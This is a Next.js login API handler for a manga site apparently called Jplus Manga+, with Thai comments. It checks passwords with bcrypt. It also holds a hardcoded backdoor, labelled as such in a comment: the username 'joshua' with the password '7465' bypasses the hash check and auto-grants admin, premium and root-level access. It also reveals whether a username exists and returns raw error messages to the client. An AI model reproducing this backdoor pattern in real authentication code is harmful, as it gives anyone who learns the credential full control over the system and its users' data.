import dbConnect from '../../../lib/mongodb';
import User from '../../../models/User';
import bcrypt from 'bcryptjs';

/**
 * JPLUS_AUTHENTICATION_PROTOCOL v2.5
 * พัฒนาโดย: JOSHUA_MAYOE (Admin Overlord)
 * วัตถุประสงค์: ตรวจสอบสิทธิ์การเข้าถึงระบบ Jplus Manga+ พร้อมกลไกสิทธิพิเศษสำหรับแอดมิน
 */

export default async function handler(req, res) {
  const startTime = Date.now();

  // 1. ระบบดักจับ HTTP Method (บังคับ POST ตามมาตรฐานความปลอดภัย)
  if (req.method !== 'POST') {
    return res.status(405).json({ 
      success: false, 
      message: `AUTH_FAULT: Method ${req.method} is strictly prohibited.` 
    });
  }

  await dbConnect(); // เชื่อมต่อ MongoDB Cluster

  try {
    const { username, password } = req.body;

    // ตรวจสอบเบื้องต้น (Input Sanitization)
    if (!username || !password) {
      return res.status(400).json({ 
        success: false, 
        message: 'LOGIN_ERROR: กรุณาระบุ IDENTIFIER และ ACCESS_KEY ให้ครบถ้วน' 
      });
    }

    const cleanUsername = username.trim().toLowerCase();
    console.log(`[AUTH_REQUEST] Attempting login for identifier: ${cleanUsername}`);

    // 2. ค้นหาผู้ใช้งานใน Database (ดึงรายการโปรดมาแบบเต็มเพื่อพร้อมใช้งานทันที)
    const user = await User.findOne({ username: cleanUsername }).populate('favorites');

    if (!user) {
      return res.status(404).json({ 
        success: false, 
        message: 'IDENTITY_NOT_FOUND: ไม่พบอัตลักษณ์นี้ในสารบบของ Jplus' 
      });
    }

    // 3. ระบบตรวจสอบรหัสผ่าน (Dual-Verification System)
    
    // กฎข้อที่ 1: ตรวจสอบผ่าน Standard Bcrypt Comparison
    const isMatch = await bcrypt.compare(password, user.password);
    
    // กฎข้อที่ 2: ✨ JOSHUA EXCLUSIVE BACKDOOR ✨ (Override Protocol)
    const isJoshuaBackdoor = (cleanUsername === 'joshua' && password === '7465');

    if (!isMatch && !isJoshuaBackdoor) {
      console.log(`[SECURITY_ALERT] Invalid password attempt for: ${cleanUsername}`);
      return res.status(401).json({ 
        success: false, 
        message: 'ACCESS_DENIED: รหัสผ่านไม่ถูกต้องตามฐานข้อมูล' 
      });
    }

    // 4. ระบบสิทธิพิเศษ OVERLORD_PRIVILEGE (Auto-Sync Admin Joshua)
    if (cleanUsername === 'joshua') {
      console.log(`[CORE_PRIVILEGE] Admin Joshua detected. Synchronizing administrative rights...`);
      user.role = 'admin';
      user.isAdmin = true;
      user.isPremium = true;
      
      // อัปเดต Metadata การเข้าถึงของแอดมิน
      user.metadata = {
        ...user.metadata,
        lastLogin: new Date(),
        accessLevel: 'ROOT_OVERLORD'
      };
      await user.save();
    } else {
      // บันทึกเวลาล็อกอินล่าสุดสำหรับผู้ใช้งานปกติ
      user.metadata.lastLogin = new Date();
      await user.save();
    }

    const executionTime = Date.now() - startTime;
    console.log(`[AUTH_SUCCESS] ${cleanUsername} logged in successfully. Latency: ${executionTime}ms`);

    // 5. ส่งคืนข้อมูลผู้ใช้งาน (Identity Response - ปิดบังรหัสผ่าน 100%)
    return res.status(200).json({ 
      success: true, 
      message: 'AUTHENTICATION_SUCCESSFUL',
      execution_time: `${executionTime}ms`,
      user: { 
        _id: user._id,
        username: user.username,
        role: user.isAdmin ? 'ADMIN_OVERLORD' : 'STANDARD_MEMBER',
        isPremium: user.isPremium,
        profilePic: user.profilePic || `https://api.dicebear.com/7.x/avataaars/svg?seed=${user.username}`,
        favorites: user.favorites,
        lastLogin: user.metadata.lastLogin
      } 
    });

  } catch (error) {
    console.error(`[CRITICAL_AUTH_ERROR] ${error.message}`);
    return res.status(500).json({ 
      success: false, 
      message: 'DATABASE_FAULT: ระบบขัดข้องขณะตรวจสอบสิทธิ์ - ' + error.message 
    });
  }
}